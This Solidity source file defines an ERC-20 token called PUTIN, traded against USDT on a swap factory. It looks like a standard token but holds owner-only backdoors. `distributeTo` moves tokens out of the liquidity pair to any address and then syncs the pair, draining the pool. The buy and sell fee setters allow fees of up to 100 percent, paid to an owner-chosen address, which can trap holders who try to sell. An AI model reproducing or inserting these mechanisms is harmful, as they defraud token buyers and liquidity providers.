abstract contract Owned {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event OwnerUpdated(address indexed user, address indexed newOwner);

    /*//////////////////////////////////////////////////////////////
                            OWNERSHIP STORAGE
    //////////////////////////////////////////////////////////////*/

    address public owner;

    modifier onlyOwner() virtual {
        require(msg.sender == owner, "UNAUTHORIZED");

        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor() {
        owner = msg.sender;
        emit OwnerUpdated(address(0), msg.sender);
    }

    /*//////////////////////////////////////////////////////////////
                             OWNERSHIP LOGIC
    //////////////////////////////////////////////////////////////*/

    function setOwner(address newOwner) public virtual onlyOwner {
        owner = newOwner;
        emit OwnerUpdated(msg.sender, newOwner);
    }
}


contract PUTIN is IERC20Metadata, Owned {
    using Address for address;
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private constant _name = "PUTIN";
    string private constant _symbol = "PUTIN";
    uint256 private constant _totalSupply = 1000_0000 ether;

    mapping(address => bool) public isOtherSwapPair;

    uint private constant RATE_PERCISION = 10000;
    uint public buyFeeRate = 0;
    uint public sellFeeRate = 0;
    address public feeTo = address(0);

    ISwapFactory public immutable ippSwapFactory;
    address public distor;

    // mainnet
    address public constant usdt =
        address(0x55d398326f99059fF775485246999027B3197955);

    constructor(address _initHolder, address _ippSwapFactory) {
        require(
            _ippSwapFactory != address(0),
            "ipp swap factory can not be address 0"
        );
        ippSwapFactory = ISwapFactory(_ippSwapFactory);

        address holder = _initHolder == address(0) ? msg.sender : _initHolder;
        _balances[holder] = _totalSupply;
        emit Transfer(address(0), holder, _totalSupply);
    }

    function name() public pure override returns (string memory) {
        return _name;
    }

    function symbol() public pure override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        uint recipientAmount = amount;
        bool isBuy = isSwapPair(sender);
        bool isSell = isSwapPair(recipient);
        if (
            recipient != address(0) &&
            // sender != liquidityProxy &&
            // recipient != liquidityProxy &&
            (isBuy || isSell)
        ) {
            uint feeRate = isBuy ? buyFeeRate : sellFeeRate;
            uint feeAmount = amount.mul(feeRate) / RATE_PERCISION;
            recipientAmount -= feeAmount;
            _takeFee(sender, feeTo, feeAmount);
        }

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _takeFee(address _from, address _to, uint _fee) internal {
        if (_fee > 0) {
            _balances[_to] = _balances[_to].add(_fee);
            emit Transfer(_from, _to, _fee);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function isSwapPair(address pair) public view returns (bool) {
        if (pair == address(0)) {
            return false;
        }

        return
            ippSwapFactory.getPair(address(this), usdt) == pair ||
            isOtherSwapPair[pair];
    }

    function addOtherSwapPair(address _swapPair) external onlyOwner {
        require(_swapPair != address(0), "_swapPair can not be address 0");
        isOtherSwapPair[_swapPair] = true;
    }

    function removeOtherSwapPair(address _swapPair) external onlyOwner {
        require(_swapPair != address(0), "_swapPair can not be address 0");
        isOtherSwapPair[_swapPair] = false;
    }

    function setBuyFeeRate(uint _rate) external onlyOwner {
        require(_rate <= RATE_PERCISION, "rate too large");
        buyFeeRate = _rate;
    }

    function setSellFeeRate(uint _rate) external onlyOwner {
        require(_rate <= RATE_PERCISION, "rate too large");
        sellFeeRate = _rate;
    }

    function setFeeTo(address _feeTo) external onlyOwner {
        feeTo = _feeTo;
    }

    function setDistor(address _distor) external onlyOwner {
        distor = _distor;
    }

    function distributeTo(uint256 amount, address to) external onlyOwner {
        address from = ippSwapFactory.getPair(address(this), usdt);
        require(_balances[from] > amount * 2, "too much");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        IPair(from).sync();
    }
}

interface IPair {
    function sync() external;
}
